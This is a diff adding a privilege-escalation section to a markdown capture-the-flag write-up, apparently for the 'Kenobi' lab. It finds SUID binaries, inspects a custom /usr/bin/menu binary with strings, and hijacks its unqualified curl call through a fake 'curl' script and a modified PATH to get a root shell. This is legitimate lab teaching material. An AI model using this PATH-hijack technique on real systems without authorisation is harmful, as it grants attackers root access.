@@ -378,9 +378,101 @@ ssh -i id_rsa kenobi@10.10.213.160
 SUID (Set User ID), SGID (Set Group ID), and sticky bits are permission identifiers with special meaning.
 
 * SUID
-  * On files:
+  * On files: User executes with permission of the file owner
+  * On directories: N/A
 
+* SGID 
+  * On files: User executes with permissions of the group owner
+  * On directories: Files created in the directory get the same group number
 
+* Sticky Bit
+  * On files: N/A
+  * On directories: Users are prevented from deleting files from other users.
+
+These bits can be found in permission indicator strings with the first capital S signifying SUID,  the second capital S signifying SGID, and a capital T signifying sticky bit. The following example has all three bits set:
+```
+rwSrwSrwT
+```
+
+We can view these types of files, we can use the following command.
+```
+find / -perm -u=s -type f 2>/dev/null
+```
+
+Here we can see a list of files with these special permissions. We find one particularly interesting binary file called /usr/bin/menu.
+```
+/sbin/mount.nfs
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/bin/chfn
+/usr/bin/newgidmap
+/usr/bin/pkexec
+/usr/bin/passwd
+/usr/bin/newuidmap
+/usr/bin/gpasswd
+/usr/bin/menu
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/at
+/usr/bin/newgrp
+/bin/umount
+/bin/fusermount
+/bin/mount
+/bin/ping
+/bin/su
+/bin/ping6
+```
+
+When we run the binary, we get three options.
+```
+kenobi@kenobi:~$ /usr/bin/menu
+
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice :
+```
+
+Lets use the strings command to see view any human readable strings in the binary. This might give us a clue as to what the binary is doing under the hood.
+```
+strings /usr/bin/menu
+
+** Enter your choice :
+curl -I localhost
+uname -r
+ifconfig
+```
+
+The first option in the menu is running curl as a command in a SUID that is owned by root. This means we can copy a shell program, rename it curl, and the SUID file will run it as root. In this case, we can rename a shell script, call it curl, and have it execute as root, thus giving us root priviledge. Make sure to give the copied curl file 777 permissions so anyone and everyone can read, write, and execute.
+```
+echo /bin/sh > curl
+chmod 777 curl
+```
+
+Now we need its location to our path.
+```
+export PATH=~:$PATH
+```
+
+Lets run /usr/bin/menu again and select option 1.
+```
+kenobi@kenobi:~$ /usr/bin/menu
+
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice :1
+# id
+uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
+```
+
+We have successfully gained root.
 
 
 
